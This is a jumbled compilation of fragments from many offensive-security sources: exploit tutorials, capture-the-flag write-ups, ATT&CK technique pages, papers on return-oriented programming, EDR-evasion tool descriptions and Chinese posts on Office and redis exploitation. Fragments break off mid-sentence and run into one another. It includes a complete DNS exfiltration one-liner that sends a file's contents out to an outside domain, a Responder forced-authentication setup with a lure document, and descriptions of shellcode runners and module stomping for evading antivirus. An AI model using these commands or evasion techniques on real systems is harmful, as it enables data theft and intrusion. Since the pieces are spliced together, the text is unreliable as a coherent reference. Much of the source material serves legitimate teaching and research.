EDIT2: As of July 13th 2009, the Linux kernel [9]integrates our patch
(2.6.31-rc3). Our patch also made it into -stable.
EDIT1: This is now referenced as a vulnerability and tracked as
CVE-2009-1895

Probably anyone who has used any modern version of Windows is aware of
their file-based shortcuts, also known as LNKs or Shell Link files.
Although they were intended as a simple feature to make Windows a bit
more user-friendly, over the years, a significant number[[11]1] of
vulnerabilities were identified in handling of LNKs. Many of these

In this paper I will present an elegant technique (it’s my opinion,
indeed) to get shell access to a vulnerable remote machine. It is not
my own technique but I found it very interesting. The focus of this
paper is on this technique and not in the way to exploit the
vulnerability.

So, in order to focus on the remote shell code and not on how to
circumvent ASLR, non-executable stacks and so on (that# Lecture 2: Stack Overflows

I am assuming you have been through the [Lecture 1
handouts](/Lecture1/README.md). In that handout I have mostly explained about
the concept of memory and stack growth. Before going on with this lecture please
read it first.

In this lecture I am planning to cover the following:
* Stack overflow.
* Their protection mechanisms.
    * ASLR.
    * Stack canaries.
* What is shell code.
* Exploiting stack overflows and changing the control flow of the program.


Let's begin.

I had recently moved into a new apartment, and was on the lookout for a new project. Seeing as I had just been given a new router by my ISP, I figured it would make a good target. It is, after all, the entrypoint into my home network.

## Disclaimer
This research was conducted on private machines in my spare time. My views and actions are my own and may not reflect the views of my employer. This research was done without malicious intent, but a desire to understand and secure the devices in my home.

# T1546.012 - Event Triggered Execution: Image File Execution Options Injection
## [Description from ATT&CK](https://attack.mitre.org/techniques/T1546/012)
<blockquote>Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by Image File Execution Options (IFEO) debuggers. IFEOs enable a developer to attach a debugger to an application. When a process is created, a debugger present in an application’s IFEO will be prepended to the application’s name, effectively launching the new process under the debugger (e.g., <code>C:\dbg\ntsd.exe -g  notepad.exe</code>). (Citation: Microsoft Dev Blog IFEO Mar 2010)

2. Libc randomization : `ulimit -s unlimited`.

In the previous Lecture we saw that how to perform arbitrary memory writes with format string vulnerability. And in this lecture we will see how to take benefits from those vulnerabilities and spawn the shell.

## [Description from ATT&CK](https://attack.mitre.org/techniques/T1574/006)
<blockquote>Adversaries may execute their own malicious payloads by hijacking environment variables the dynamic linker uses to load shared libraries. During the execution preparation phase of a program, the dynamic linker loads specified absolute paths of shared libraries from environment variables and files, such as <code>LD_PRELOAD</code> on Linux or <code>DYLD_INSERT_LIBRARIES</code> on macOS. Libraries specified in environment variables are loaded first, taking precedence over system libraries with the same function name.(Citation: Man LD.SO)(Citation: TLDP Shared L# Winamp-5.12-Playlist-UNC-Path-Computer-Name-Overflow-Remote-Code-Execution-Exploit

Kernel Hacking With HEVD Part 3 - The Shellcode
Jul 7, 2016
In the [4]last blog entry in this series we got to the point where we
have crashed the kernel in a controlled manner. This is a good spot to
be in! But it would be better if we used this situation to escalate
privileges instead of just looking at our pretty blue screen. Let’s
talk kernel payloads.
Token Stealing
The end goal of this exploit is to have a command prompt open with
SYSTEM level access. Once you have control of execution in ring 0 there
are many options for getting to that end goal but one of the most
popular seems to be token stealing. The Windows security model is

Hacking Blind

Abstract—We show that it is possible to write remote stack
buffer overflow exploits without possessing a copy of the target
binary or source code, against services that restart after a crash.
This makes it possible to hack proprietary closed-binary services,
or open-source servers manually compiled and installed from
source where the binary remains unknown to the attacker. Tra-
ditional techniques are usually paired against a particular binary
and distribution where the hacker knows the location of useful
gadgets for Return Oriented Programming (ROP). Our Blind

From fuzzing to 0-day
Written on May 14, 2014
A couple of days ago, I found an interesting bug during a fuzzing
session that led to me creating a 0-day exploit for it. I’ve been asked
a few times about the methods I use to find bugs and write exploits, so
I’ve decided to take this opportunity to describe one particular
workflow I use. In this post, I’ll take you through finding a bug,
analzying it, and creating a functional exploit.
In order to benefit from this post, you should be familiar with basic
fuzzing and exploit development.

[5]Notes on abusing exit handlers, bypassing pointer mangling and glibc
ptmalloc hooks
Hi,
Today we'll talk about abusing exit handlers in order to hijack the
control flow.
This research stemmed from Google Project Zero article about heap
overflow
NULL byte poisoning where they described using __exit_funcs or
tls_dtor_list
to achieve code execution.
The issue I had was to find a way to resolve reliably these
non-exported symbols and access them.

Heartbleed tl;dr With a reasonably simple fuzzing setup I was able to
rediscover the Heartbleed bug. This uses state-of-the-art fuzzing and
memory protection technology (american fuzzy lop and Address

of the Heartbleed bug or the TLS Heartbeat extension. We can learn from
this to find similar bugs in the future.

Vulnerability Discovery Against Apple Safari
Evaluating Complex Software Targets for Exploitable Vulnerabilities
June 13, 2018 / [4]Patrick Biernat & [5]Markus Gaasedelen
__________________________________________________________________
Vulnerability discovery is the first stage of the [6]exploit
development lifecycle. The duration of this phase is open-ended because
the search space, code quality, and evaluation process for a given
target can vary wildly. Deciding between manual and automated
vulnerability discovery is often a question of priorities and can be
difficult to balance effectively.

Another Go Shellcode Runner

Introduction
After reading through [13]BlackHat Go, I wanted a project that would
further my familiarity with Go. I figured a shellcode runner would be a
fun exercise with the added benefit of resulting in something I could
potentially use operationally.
I had the following goals:

## Context

We find a binary with owner ```level3``` and SUID.
```
level2@RainFall:~$ ls -l

Running the binary, it seems to read from stdin, and print what is given.

## Solution

After a certain length of input it segfaults.

# Security Update
In glibc-2.38, it's harder to use this skill since glibc developers make `libc_exe_address` not writable, which is a key value of our exploitation. However, I designed another way to exploit it!
The main idea is to perform ROP on GOT. You can assume we control the whole GOT tab:

- The program calls sink functions, for example, puts
- Puts triggers our first gadget on `slot[0x11]`
- We can modify `slot[0x11]` to `asctime+0x132`, assuming ascime calls slot[0x1] at `asctime+0x140`
- So we can use the code between asctime+0x132` and `asctime+0x140`
- We can repeat the previous steps and set the registers and call gets then perform ROP to get a shell.

Bypassing ASLR and DEP - Getting Shells with pwntools
Jul 2, 2019
9 min. read
Today, I’d like to take some time and to present a short trick to
bypass both ASLR (Address Space Layout Randomization) and DEP (Data
Execution Prevention) in order to obtain a shell in a buffer-overflow
vulnerable binary.
I’ve seen this problem discussed using return-to-PLT strategies, which
is fine if your targeted method is already used in the binary –
although, let’s face it, not many programs will call system() or exec()
and invite you to spawn shells.
This approach revolves around a return-to-libc attack in which the
attacker first leaks the address of a known function (e.g.# Educational Heap Exploitation

This repo is for learning various heap exploitation techniques.
We came up with the idea during a hack meeting, and have implemented the following techniques:

# OPC-UA Exploitation Framework / by Claroty Team82

### TL;DR
Advanced OPC-UA framework for vulnerability research & exploitation. 

Using this framework, we've implemented many unique attacks against OPC-UA implementation - all of which we, or other researchers, responsibly disclosed. So far, using `OPC-UA Exploitation Framework` we found & disclosed ~50 CVEs.

### Background
In the past few years we ([Claroty Research - Team82](https://claroty.com/team82)) conducted an extensive analysis of the [OPC-UA](https://opcfoundation.org/about/opc-technologies/opc-ua/) network protocol prevalent in operational technology (OT) networks worldwide. During that research, we found and privately disclosWhen Good Instructions Go Bad:
Generalizing Return-Oriented Programming to RISC

La Jolla, California, USA
This paper first appeared in Proceedings of CCS 2008, ACM Press, Oct. 2008.
ABSTRACT
This paper reconsiders the threat posed by Shacham’s “return-ori-
ented programming” — a technique by which W⊕X-style hardware
protections are evaded via carefully crafted stack frames that divert
control flow into the middle of existing variable-length x86 instruc-
tions — creating short new instructions streams that then return. We
believe this attack is both morBlind Return Oriented Programming (BROP)
When hacking software, there are three exploit scenarios:
1. Open-source (e.g., Apache)
2. Open-binary (e.g., Internet Explorer)
3. Closed-binary and source (e.g., some proprietary network service)
This work studies whether it is possible to attack the third case.
The BROP attack makes it possible to write exploits without possessing
the target's binary. It requires a stack overflow and a service that
restarts after a crash. Based on whether a service crashes or not
(i.e., connection closes or stays open), the BROP attack is able to
construct a full remote exploit that leads to a shell. The BROP attack
remotely leaks enough gadgets to perform the writ#[1]Corelan Cybersecurity Research » Feed [2]Corelan Cybersecurity

```
#include <stdlib.h>
#include <stdio.h>

void revelation()
{
  char light[489];
  fgets(light, sizeof(light) - 1, stdin);
  printf(light);
}

void pivot() 
{
  char reroute[10];
  gets(reroute);
}

int main()
{
  revelation();
  pivot();
}

void discovery()
{
         puts("My best engineers assured me that this code was impenetrable. You have shed some light into this matter. Level Cleared!");
}
```

As you can see the code is altered from the 64 bit version to make things run smoother. Now let's look at what binary mitigations are in place using pwntools.

# Forced Authentication

## Execution via Hyperlink

Let's create a Word document that has a hyperlink to our attacking server where  `responder` will be listening on port 445:

![](../../.gitbook/assets/forced-auth-word.png)

{% file src="../../.gitbook/assets/Totes not a scam.docx" %}
Forced SMBv2 Authentication - MS Word File
{% endfile %}

Let's start `Responder` on our kali box:

{% code title="attacker@local" %}
```csharp
responder -I eth1
```
{% endcode %}

Once the link in the document is clicked, the target system sends an authentication request to the attacking host. Since responder is listening on the other end, victim's `Ne
# Forcing Iexplore.exe to Load a Malicious DLL via COM Abuse

It's possible to force iexplore.exe (or explorer.exe) to load a malicious DLL and execute it - a technique which could be used when attempting to evade certain defenses.

The technique works as follows:

* An attacker creates a malicious DLL that he wants iexplore.exe to load and execute - I used a meterpreter payload in this lab
* On a victim system, the attacker defines a new COM server by creating the required keys and values in the registry. The previously created malicious DLL will be set to handle the COM client calls. In our case, the DLL will only perform one action - it will execute the meterpreter shellcode upon load

Due to the serious risk of a BlueKeep based worm, I’ve held back this
write-up to avoid advancing the timeline. Now that a proof-of-concept
for RCE (remote code execution) has been release as part of Metasploit,
i feel it’s now safe for me to post this.

## Vulnerability

Heap Overflow + Memory Corruption

## Context

We find a binary with owner level8 and SUID.
```
level7@RainFall:~$ ls -l
-rwsr-s---+ 1 level8 users 5648 Mar  9  2016 level7
```
It segfaults when run with 0 or 1 argument. It reponds to 2 or more arguments with "~".
```
level7@RainFall:~$ ./level7
Segmentation fault (core dumped)

## Vulnerability

Ret2Libc attack on unprotected data table

## Context

We find a binary with owner ```level08``` and SUID.
```
level07@OverRide:~$ ls -l
-rwsr-s---+ 1 level08 users 11744 Sep 10  2016 level07

Note: the owner of this binary is level2. 

## Solution

Let's see what the binary does. 
```
level1@RainFall:~$ ./level1

## Creative C2 Redirection:

This year, I have challenged myself to engineer creative solutions for command-and-control (C2) server redirection. A redirector is a server that sits between your malware controller and the target network. When conducting an engagement, it's crucial to protect offensive infrastructure from detection by defenders. Leveraging cloud features to make  network traffic look legitimate aids in evading intrusion detection systems and can lead to successful completion of offensive operations.

Another Go Shellcode Runner
Art by [12]clgtart
Introduction
After reading through [13]BlackHat Go, I wanted a project that would
further my familiarity with Go. I figured a shellcode runner would be a
fun exercise with the added benefit of resulting in something I could
potentially use operationally.
I had the following goals:

A little more fun with Mach-O headers: adding and spoofing a constructor
February 6, 2012 · 3 min · 594 words
The fun with Mach-O headers continues, this time with a “simple” trick
to inject a new constructor and “spoofing” its location. It does not
work in iOS (non-jb) and it will be killed if Apple decides to do
things right and respect the specification, so let’s disclose it! Might
be useful for some wannabe malware writer. I bet that OS X malware
analysts are demanding some fun into their “boring” work time.

The first step in completing any binary challenge is to first run the program and see what it does. I ran it tried getting a segmentation fault by filling the buffer with a ton of A's and tried empty inputs.

Then we open up the assembly in nano after using objdump to get an idea of the program layout and where we should set our break points in gdb and perform the static analysis. This problem can be easily solved solely through static analysis; which for this write up we will focus on.

Looking through main there are a few details that catch my eye in this block.

Posted on [13]June 23, 2015June 25, 2015 by [14]sploitfun
VM Setup: Ubuntu 12.04 (x86)
What is Integer Overflow?
Storing a value greater than maximum supported value is called integer
overflow. Integer overflow on its own doesnt lead to arbitrary code
execution, but an integer overflow might lead to stack overflow or heap
overflow which could result in arbitrary code execution. In this post I
will be talking ONLY about integer overflow leading t#[1]RSS

TL;DR
As already explained in my previous post “[3]The path to code execution
in the era of EDR, Next-Gen AVs, and AMSI”, various security products,
such as AVs and EDRs, place hooks in user-mode API functions to analyse
the execution flow of a specific API in order to detect potentially
malicious activities. Naturally, any Red Team Member will always need
to find a way to address this “issue”, and execute specific code on a
target environment without being flagged.
To anyone not familiar with API hooking, you can check this [4]link

Understanding Buffer Overflow Exploits
The first time that I had to work with a buffer overflow exploit, I was
completely out of my depth. Although I could build networks and
configure firewalls, proxies, and intrusion detection systems without
breaking a sweat, exploit coding was a whole new world to me. However,
as with any complex or difficult concept, breaking it down into
manageable pieces proved to be an effective strategy.
After conducting research and following tutorials, the concepts and
tools started to become less confusing and the details # Exercise 6 - GIMP

For this exercise, we will fuzz **GIMP** image editor. The goal is to find a crash/PoC for [**CVE-2016-4994**](https://www.cvedetails.com/cve/CVE-2016-4994/) in GIMP 2.8.16.

  **CVE-2016-4994** is an Use-After-Free vulnerability that can be triggered via a crafted XCF file.
  
 Use after free errors occur when a program continues to use a pointer after it has been freed.

While preparing for my upcoming OSCE exam I have spent many hours

which can be found [7]here. All credit for this technique goes to them,
I am merely using it to exploit a similarly small buffer space without
making use of an egghunter or re-using sockets.

Living Dangerously with Module Stomping: Leveraging Code Coverage Analysis
for Injecting into Legitimately Loaded DLLs
"Module stomping" is an approach to hiding malicious code in a process'
memory, and having it appear to be a legitimately loaded module (i.e.,
DLL). This post will explore a variant of this technique, which
involves injecting code into legitimately loaded DLLs in unused memory
regions based on code coverage analysis. [8]Supporting scripts are on
GitHub.
Module stomping 101 and why do it differently?

One of the c# Sing About Me Im Dying Of Thirst


In this directory you'll find the PoC version of the Sing About Me Im Dying Of Thirst exploit. When launched the nimcontroller will remain in an IDLE state. You'll still get a shell but the service will remain unavailable to system administrators. I've decided not to include the method allowing execution to continue in order to prevent worms (IR should spot multiple IDLE services quick). Apart from that, the exploit is as stable as it gets.

This is by far the most critical vulnerability found during my research on the Nimbus protocol and the most interesting. After gaining RIP control, the battle had just begun as x64 userland exploitation is not well do

Exfiltrate data with QR code videos generated from files by HTML5/JS.

## Data => QR Code Video ##
Host the files in the folder labled `file_to_qr` on a web server. Visit the web server. Drag and drop a file into the browser window where it says `Drop files here...`. A video of QR codes should start flashing.

Point a cellphone camera or other video capture device at the screen and record. Make sure to record until you have seen the blue flash twice. This will ensure that you have gotten all the data.

## QR Code Video => Data ##

First you need to convert the data to something that opencv will understand. See [this page](http://opencv.willowgarage.com/wiki/### unistruct

Wrong edit implementation on vector (data type 4), it will decrement the pointer by 4 when appending to the vector (giving 0 to append or in place):
```*p = local_20 + -0x4;```

Then there is the possibility to dereference it as a pointer and write an integer there:
```
puVar6 = (uint *)deref_rdi(&p);
*puVar6 = uVar1;
```
That could lead to oob backward write and read.

CVE-2017-11882利用
发表于 2017-11-21 | 分类于 [10]奇技淫巧
最近这段时间CVE-2017-11882挺火的。关于这个漏洞可以看看这里:[11]隐藏17年的Office远程代码执行漏洞POC样本分析（CV
E-2017-11882）。
今天在twitter上看到有人共享了一个POC，[12]twitter地址，[13]poc地址，后来又看到有人共享了一个项目[14]CVE-2
017-11882，简单看了一下这个项目，通过对rtf文件的修改来实现命令执行的目的，但是有个缺陷就是，这个项目使用的是使用webdav的方式
来执行远程文件的，使用起来可能并不容易，所以就对此文件进行了简单的修改，具体项目地址如下：GIT：[15]CVE-2017-11882 。
使用方式很简单，如果要执行命令

关于怎么进一步利用，可以参考之前写的[16]《windows命令执行漏洞不会玩？

Fuzzing workflows; a fuzz job from start to finish
By [12]@BrandonPrry
Many people have garnered an interest in fuzzing in the recent years,
with easy-to-use frameworks like American Fuzzy Lop showing incredible
promise and (relatively) low barrier to entry. Many websites on the
internet give brief introductions to specific features of AFL, how to
start fuzzing a given piece of software, but never what to do when you
decide to stop fuzzing (or how you decide in the first place?).

A year of Windows kernel font fuzzing #1: the results
Posted by Mateusz Jurczyk of Google Project Zero
This post series is about how we used at-scale fuzzing to discover and
report a total of 16 vulnerabilities in the handling of TrueType and
OpenType fonts in the Windows kernel during the last year. In part #1
here, we present a general overview of the font security area, followed
by a high-level explanation of the fuzzing effort we have undertaken,
including the overall results and case studies of two bug collisions.

In Part 1 of this series, we’ll be exploiting a stack buffer overflow
using a Saved Return Pointer Overwrite attack. Hopefully, you’re all
caught up on the necessary prerequisite knowledge after reading [6]Part
0 and you’re itching to develop an exploit. Our target is going to be
the Windows port scanner NScan version 0.9.1 (download it [7]here).
Details for this exploit were found on [8]Exploit-DB. After downloading
and installing the vulnerable program on your Windows XP v# 0x00 beginning

# Format String Vulnerability 1

Format string vulnerabilities silly bug that is due to the poor coding practice
of the programmer. If a programmer passes an attacker-controlled buffer as an
argument to a `printf` call (or any format string related function, e.g `sprintf,
fprintf`), attacker can perform write to arbitrary memory address.

To understand what I am talking about, take a look at the below example.

```C
int main(int argc, char** argv) {
    char buffer[100];
    strcpy(buffer, argv[1]);
    printf(buffer);
    return 0;
}
```

`printf` takes variable number of
arguments and the `format specifier` identifies how many arguments it **should**
access and what kind of data is stored #[1]GitHub

Abstract:
Intrusion detection systems that monitor sequences of system calls have
recently become more sophisticated in defining legitimate application
behavior. In particular, additional information, such as the value of
the program counter and the configuration of the program's call stack
at each system call, has bee

Fun With Info-Leaks
This article is about information leaks in form of memory disclosures
created in Internet Explorer 10 32-bit on Windows 7 64-bit. They are
used to bypass full ASLR/DEP to gain remote code execution. While the
software containing the bug might not be that popular, it’s quite nice
what can be done with the bug.
Reading this article requires some familiarity with [8]WinDbg, [9]heap
[10]spray , and [11]info-leaks.
Hope you enjoy it.

So this looks similar to a lot of the previous levels. We have to change the value of the target integer to 0xe5ca3. However this challenge is different since it is the first format string level where we give input through argv[1]. This means that our inp#[1]BREAKDEV

Sniping Insecure Cookies with XSS
In this post I want to talk about improper implementation of session
tokens and how one XSS vulnerability can result in full compromise of a
web application. The following analysis is based on an existing
real-life web application. I cover the step-by-step process that lead
to administrator's account take over and I share my thoughts on what
could have been done to better secure the application.

# ParallelSyscalls

Rust version of MDSec's ParallelSyscalls research: https://github.com/mdsecactivebreach/ParallelSyscalls/ and https://www.mdsec.co.uk/2022/01/edr-parallel-asis-through-analysis/

This code can be used to load a fresh copy of `NTDLL.dll` using system calls and extract system calls from the fresh copy of `NTDLL.dll` to call any Win32 API function of your choice. This may allow you to evade AV/EDR detections. Please note that the syscall stubs are allocated using `RWX` memory created using `VirtualAlloc()`, which is not optimal from an OPSEC perspective.

SysWhispers is dead, long live SysWhispers!
TL;DR
As already explained in my previous post “[3]The path to code execution
in the era of EDR, Next-Gen AVs, and AMSI”, various security products,
such as AVs and EDRs, place hooks in user-mode API functions to analyse
the execution flow of a specific API in order to detect potentially
malicious activities. Naturally, any Red Team Member will always need
to find a way to address this “issue”, and execute specific code on a
target environment without being flagged.
To anyone not familiar with API hooking, you can check this [4]link

Part 2: Saved Return Pointer Overflows
For our first exploit we will be starting with the most straight
forward scenario where we have a clean EIP overwrite and one of our CPU
registers points directly to a large portion of our buffer. For this
part we will be creating an exploit from scratch for ”FreeFloat FTP”.
You can find a list of several exploits that were created for
”FreeFloat FTP” [12]here.
Normally we would ne# Level 4

## Vulnerability

gets() stack overflow + Return-to-libc

## Context

We find a binary with owner ```level05``` and SUID.
```
level04@OverRide:~$ ls -l
-rwsr-s---+ 1 level05 users 7797 Sep 10  2016 level04
```

When run it gives us a hint, then reads from stdin, then exits.
```
level04@OverRide:~$ ./level04

[... user input from stdin ...]
child is exiting...
level04@OverRide:~$
```

## Solution

### main() overview

First ```main()``` forks a child process, and links the child's return to the parent.

Then ```gets()``` reads stdin into a buffer.

Finally the child process is killed if it makes a syscall to exec().

It segfaults when run without arguments. It replies to random arguments with "Nope".

CS:GO RCE 0-day - Real World CTF Qualifiers 2018
03 Aug 2018
This was the P90_Rush_B challenge from Real World CTF Qualifiers -
2018, in which we participated as perfect blue
This challenge was solved by [3]@j0nathanj and [4]@_VoidMercy.
Unfortunately we did not manage to solve this challenge by the time the
CTF ended, but we kept working on it the next 2 days and managed to
successfully exploit it! :)
Our solution to this challenge involves a 0-day, which was also found a
few days earlier by the great [5]@_niklasb from Eat Sleep Pwn Repeat,
and was fixed in the latest update.
We decided to make this write-up as detailed as we can, to show our

Exploiting the DRAM rowhammer bug to gain kernel privileges
Posted by Mark Seaborn, sandbox builder and breaker, with contributions
by Thomas Dullien, reverse engineer
[This guest post continues Project Zero’s practice of promoting
excellence in security research on the Project Zero blog]
Overview
“Rowhammer” is a problem with some recent DRAM devices in which
repeatedly accessing a row of memory can cause bit flips in adjacent
rows. We tested a selection of laptops and found that a subset of them
exhibited the problem. We built two # Data Exfiltration PoC Scripts

## DNS Exfliltration (dns_catch.py)
Run dns_catch.py on your DNS server.

On target system execute via bash:
file="secretz.tgz"; key="moo"; domain="sensepost.com" i=1; md=$(cat $file| md5sum| cut -d " " -f 1); len=$((`xxd -p $file |wc -l`)); for h in `cat $file | xxd -p`; do host $h.0.$i.$len.$key.$domain; i=$(($i+1));done; host $md.1.$i.$len.$key.$domain

## ICMP (icmp_shover.py)
### Sending:
Read n bytes of file
Convert to hex
Create ICMP() packet with destination / source headers
Pack ICMP() data section with the hex
Drop it onto the wire!

### Receving:
Listen on network interface for icmp packets (with a little signature)

Freeze
Freeze by Optiv is a payload creation tool used for circumventing EDR
security controls to execute shellcode in a stealthy manner. * The following is a list of exploits that details my progression of understanding as I learned more about binary exploitation. 
	* Each exploit is better than the last and I think going through the differences may help with understanding of different concepts.

* `exploit.py` is meant for if you have access to the actual binary and can open the process in gdb

* `altExploit.py` uses a more traditional bruteforce method, which is for when you don't have access to the binary

* `finalExploit.py` is a much more efficient bruteforce method that I made after realizing I only have to bruteforce half of one byte of the address. It also addresses a logical error that my previous exploits were based#[1]Fzuckerman© » Feed [2]Fzuckerman© » Comments Feed [3]Fzuckerman© »

Abstract
This paper presents several methods of bypassing the protection mechanism built into Microsoft’s
Windows 2003 Server that attempts to prevent the exploitation of stack based buffer overflows.
Recommendations about how to thwart these attacks are made where appropriate.
Introduction
Microsoft is committed to security. I've been playing with Microsoft products, as far as security is
concerned, since 1997 and in the past year and a half or two I've seen a marked difference with
some very positive moves made. In a way they had to. W

How to heap?
Posted on 2019-03-21
In this post, I will play with some classic heap exploitation tricks in
Linux Glibc, in order to better understand the linux kernel heap
management.
Background
Heap is a logically continuous area that consists of many chunks. For
heap allocator such as ptmalloc, the minimum operation unit is the
chunk. Chunks are classified into 4 different categories. 1. Allocated
chunk 2, Free chunk; 3, Top chunk; 4. Last Remainder chunk. malloc
maintains a finite state machine whitin the four types of chunks. A
detailed analysis of ptmalloc anylasis can be find here (in Chinese)

# Libc-GOT-Hijacking

Transform arbitrary write to RCE.

This is a userspace attacking skill: If you can write arbitrary memory space, you can use this method to execute arbitrary code. 

> You only need to know the base address of Glibc

## glibc > 2.35

Compared to glibc<=2.35 there is mitigation implemented, which forbids the methods for the old library. However, we desgined a method to bypass it and execute arbitrary code by 
once arbitrary write on Glibc's GOT table. This method performs Return Oriented Programming (ROP) attack on the Global Offset Table (GOT).

# Introduction

FIRMADYNE is an automated and scalable system for performing emulation and
dynamic analysis of Linux-based embedded firmware. It includes the following
components:

* modified kernels (MIPS: [v2.6.32](https://gBuilding your own Shell-codes
We all know a typical BOF/Format string exploit, where we
inject a buggy program with a malicious payload making it
possible to take control over the execution of program and
run our injected payload(shell-codes).
Consider for example:
http://www.exploit-db.com/exploits/9608 this local exploit
Metasploit is the right source for picking up the suitable
payload for our exploits, from a list of many, and it even got
the capability to encode our shellcodes. But as it’s a freely
available exploit suit majority of the payloads get detected by
AV’s .So there comes the necessity of building custom shell
codes.
So this paper will be a guide to build your own shell codes

Make Userland Great Again!
Introduction
On October 4th, [5]@jndok did an amazing writeup on [6]how to exploit
the Pegasus vulnerabilities on OS X.
Shortly after that I started working on a tool to exploit them on iOS,
in order to add the tfp0 kernel patch that has been missing from
Pangu’s 9.0 and 9.2-9.3.3 jailbreaks. On December 4th, my tool had
advanced enough for me to release [7]a proof of concept video, it was
still far from complete. I intended to bring it to full compatibility
with as many devices and OS versions as possible, but shortly after my
PoC, [8]@qwertyoruiopz released a [9]web-based## Vulnerable Application

This module exploits a SEH stack buffer overflow in Shenzhen Sricctv Technology DeviceViewer version 3.10.12.0. By creating a specially crafted "Username" and copying its value in the DeviceViewer's "User" login field, an attacker will be able to gain arbitrary code execution in the context of currently logged-in user.

By attacking Glibc GOT, We can transform arbitrary write to RCE. I shrank the origin method from 0x418 bytes to 0x1f0 bytes. Meanwhile, for common IO functions, I constructed shorter payloads (0x50 bytes). Also, I talked about the method to make it shorter by combining one_gadget.

[4]How Heartbleed could've been found
Heartbleed tl;dr With a reasonably simple fuzzing setup I was able to
rediscover the Heartbleed bug. This uses state-of-the-art fuzzing and
memory protection technology (american fuzzy lop and Address
Sanitizer), but it doesn't require any prior knowledge about specifics
of the Heartbleed bug or the TLS Heartbeat extension. We can learn from
this to find similar bugs in the future.
Exactly one year ago a bug in the OpenSSL library became public that is
one of the most well-known security bug of all time: [5]Heartbleed. It
is a bug in the code > $ Zon8 Research

[3]JavaScript Engine Fuzzing and Exploitation Reading List [Updated 2022]
In [4]The Layman’s Guide To Zero-Day Engineering Markus and Amy of
Ret2Systems emphasized the importance of building your own library of
bookmarks on security and architecture literature on the target you
want to exploit. We have always taken this point to heart and have been
maintaining our own list of bookmarks for a while now on Trello. Today
we are making this list public for everyone’s reference.

CVE-2019-18683: Exploiting a Linux kernel vulnerability in the V4L2 subsystem
Feb 15, 2020
This article discloses exploitation of CVE-2019-18683, which refers to
multiple five-year-old race conditions in the V4L2 subsystem of the
Linux kernel. I found and fixed them at the end of 2019. Here I'm going
to describe a PoC exploit for x86_64 that gains local privilege
escalation from the kernel thread context (where the userspace is not
mapped), bypassing KASLR, SMEP, and SMAP on Ubuntu Server 18.04.
Today I gave [6]a talk at OffensiveCon 2020 about it ([7]slides). First

Pwn the n00bs - Acunetix 0day
A few weeks ago I have published an article about WINRAR 0DAY.
That article revealed a new vulnerability that gave attackers, the
ability to perform spoofing attack.
Many people wrote to me about the problems of that kind of article
([5]for example).
So this time I’m goanna reveal a new 0DAY that will help security
managers to protect their web sites against many vulnerability scans.
A lot of sites owners will tell you that the majority numbers of scans,
performed against their sites, are performed by automatic tools like
NESSUS, ACUNETIX, and APPSCAN.

Portable Executable Injection For Beginners
[15]Marcus Hutchins
Process Injection
Process injection is an age old technique used by malware for 3 main
reasons: Running without a process, placing user-mode hooks for a
rootkit or formgrabber, and bypassing antivirus / firewalls by
injecting whitelisted processes. The most common method of process
injection is DLL Injection, which is popular due to how easy it is. A

Owning Internet Printing - A Case Study in Modern Software Exploitation
Guest posted by Neel Mehta (nmehta@google.com) - June 19th, 2015
Abstract
Modern exploit mitigations draw attackers into a game of diminishing
marginal returns. With each additional mitigation added, a subset of
software bugs become unexploitable, and others become difficult to
exploit, requiring application or even bug-specific knowledge that
cannot be reused. The practical effect of exploit mitigations against
any given bug or class of bugs is the subject of gr

细数 redis 的几种 getshell 方法
2020-04-02 19:34:00 [9]安全
哔哔两句
在我以往对 redis 服务的渗透经验中总结了以下几点可以 getshell 的方法。
* 写文件
+ 特殊文件
o Windows
# 开机自启动目录
o Linux
# crontab
# SSH key
+ webshell
* 反序列化
+ java 反序列化
o jackson
o fastjson
o jdk/Hessian 反序列化
+ python 反序列化
+ php 反序列化
* 主从复制 RCE
* Lua RCE
下面我会逐一对这几种redis getshell的方法展开讲解
写文件
写文件这个功能其实就是通过修改 redis 的 dbfilename、dir 配置项。
通常来说掌控了写文件也就完成了 rce 的一半。
这几种写文件来 getshell 的方式也是最有效最简单的。
写开机自启动
在 Windows 系统中有一个特殊的目录，在这个目录下的文件在开机的时候都会被运行。

A year of Windows kernel font fuzzing #1: the results
Posted by Mateusz Jurczyk of Google Project Zero
This post series is about how we used at-scale fuzzing to discover and
report a total of 16 vulnerabilities in the handling of TrueType and
OpenType fonts in the Windows kernel during the last year. In part #1
here, we present a general overview of the font security area, followed
by a high-level explanation of the fuzzing effort we have undertaken,
including the overall results and case studies of two bug collisions.

A basic/simple PoC in Rust made for fun, practice, and learning. Check out my Manual Mapper in Rust: https://github.com/memN0ps/mmapper-rs or Shellcode Reflective DLL Injection in Rust: https://github.com/memN0ps/srdi-rs for alternatives.

## Description

Module stomping injects a Microsoft-signed DLL (e.g amsi.dll) using a classic DLL Injection technique that uses as shown here: [Classic DLL Injection in Rust](https://github.com/memN0ps/arsenal-rs/tree/main/dll_injector_classic-rs). It will then read the `AddressOfEntryPoint` of the injected DLL from the target process and overwrite the content with shellcode.

Maximum Overkill Two - From Format String Vulnerability to Remote Code

You might remember my first [6]Maximum Overkill writeup, where I made a
ROP exploit with ASLR/NX bypass for a simple buffer overflow exercise.
I completed another over-the-top, why-would-you-even-do-this exploit

did the [8]shellcoding challenges, which I really enjoyed. I completed

Let's take a look at the source code...

```
#include <stdio.h>
#include <string.h>

void nothing()
{
	char* buf0[50];
	printf("%p\n", &buf0);
	gets(buf0);
}

int main()
{
	printf("Even if you do hack this elf, what are you going to do?. You should really get back to research.\n");
	nothing();
}
```

So we can see that it suffers from the same buffer overflow vulnerabillity as the rest. However unlike the previous levels, there isn't anywhere in here that will print out "Level Cleared!". So we will have to somehow pop a shell and read the "out file". What we can do, is we can push our own shellcode (shellcode is precompiled assembly code that you can push onto a program of the same architect#[1]Corelan Cybersecurity Research » Feed [2]Corelan Cybersecurity

This is because in order to perform the same exploit, you would need to input null bytes ("\x00") to get the proper formatting, however since argv uses null bytes to seperate items I wasn't able to input null bytes (I would encourage you to compile the code from f6 as 64 bit, and try to pwn it). So for this I came up with new source code.

```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>


int main(int argc, char **argv)
{
	char *target;
	target = malloc(sizeof(char));

IOHIDeous
“IOHIDFamily once again.”
Introduction
This is the tale of a macOS-only vulnerability in IOHIDFamily that
yields kernel r/w and can be exploited by any unprivileged user.
IOHIDFamily has been notorious in the past for the many race conditions
it contained, which ultimately led to large parts of it being rewritten
to make use of command gates, as well as large parts being locked down
by means of entitlements. I was originally looking through its source
in the hope of finding a low-hanging fruit that would let me compromise
an iOS kernel, but what I didn’t know then is that some parts of
IOH# Vulnerable Application

